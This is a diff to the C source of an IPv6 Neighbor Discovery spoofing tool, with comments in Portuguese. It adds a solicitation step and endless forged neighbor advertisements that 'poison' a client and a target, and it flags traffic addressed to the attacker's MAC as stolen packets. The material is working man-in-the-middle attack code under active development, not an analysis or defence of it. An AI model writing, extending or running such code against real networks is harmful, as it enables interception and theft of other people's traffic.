@@ -22,7 +22,6 @@
 
 #define DEBUG 0
 
-
 int sniff;
 
 void termination_handler(int signum) {
@@ -38,8 +37,15 @@ void poison(struct victim *dst) {
 	char *pkt;
 
 	printf("Setting up Client poisoning\n");
-	pkt = alloc_ndadvert(&svictim, dst);
+	debug_cvivtim(dst);
+	/* Begin Teste */
+	if ((pkt = alloc_ndsolicit(&dst->ipv6))) {
+		send_packet(pkt);
+		free(pkt);
+	}
+	/* End Teste */
 
+	pkt = alloc_ndadvert(&svictim, dst);
 	//for (i = 0; i < 1000; i++) {
 	for (;;) {
 		send_packet(pkt);
@@ -74,7 +80,6 @@ void populate_cvictim(char *pkt) {
 	memcpy(&(cvictim->hwaddr), &(eth->h_source), ETH_ALEN);
 
 	debug_cvivtim(cvictim);
-	poison(cvictim);
 }
 
 void packet_action(char *packet) {
@@ -95,11 +100,16 @@ void packet_action(char *packet) {
 			if (icmpv6->icmp6_type == ND_NEIGHBOR_SOLICIT) {
 				nd = (struct nd_neighbor_solicit *)icmpv6;
 				if (!memcmp(&nd->nd_ns_target, &svictim.ipv6, sizeof(struct in6_addr))) {
-					/* TODO */
-					printf("Thread de poison para o client.\n");
-					/* Sempre que o client enviar um solicitation a gente vai
-					 * envenenar ambas as partes */
-					poison(cvictim);
+					if (!victim_info_complete(cvictim))
+						populate_cvictim(packet);
+
+					if (!cvictim->poisoned) {
+						/* TODO */
+						printf("Thread de poison para o client.\n");
+						/* Sempre que o client enviar um solicitation a gente vai
+						 * envenenar ambas as partes */
+						poison(cvictim);
+					}
 				}
 			}
 			break;
@@ -108,9 +118,6 @@ void packet_action(char *packet) {
 	if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
 		/* Pacote para nossa vitima. */
 		/* Por enquanto é apenas suportado 1 cliente */
-		if (!cvictim)
-			/* já faz o primeiro poison só prá deixar de ser otário */
-			populate_cvictim(packet);
 
 		/* Se o mac destino for o do atacante, é pacote roubado */
 		if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
